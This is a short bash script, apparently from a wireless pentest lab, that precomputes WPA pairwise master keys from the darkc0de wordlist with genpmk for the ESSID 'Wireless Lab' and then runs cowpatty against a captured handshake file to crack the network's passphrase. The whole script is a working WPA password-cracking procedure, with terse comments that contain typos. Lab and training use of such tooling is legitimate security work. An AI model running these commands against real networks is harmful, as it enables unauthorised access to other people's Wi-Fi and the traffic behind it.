#!/bin/bash

#-----------------------------------------------#
#	pre_calculate_pmk
#-----------------------------------------------#


#-----------------------------------------------#
#	genpmk
#-----------------------------------------------#

genpmk -f /pentest/passwords/wordlists/darkc0de.lst -d PMK-Wireless-Lab -s "Wireless Lab"


# -f /pentest/passwords/wordlists/darkc0de.lst = worlist
# -d PMK-Wireless-Lab = 
# -s "Wireless Lab" = netword essid


#-----------------------------------------------#
#	cowpatty
#-----------------------------------------------#

cowpatty -d PMK-Wireless-Lab -s "Wireless Lab" -r WPACrackingDemo-01.cap





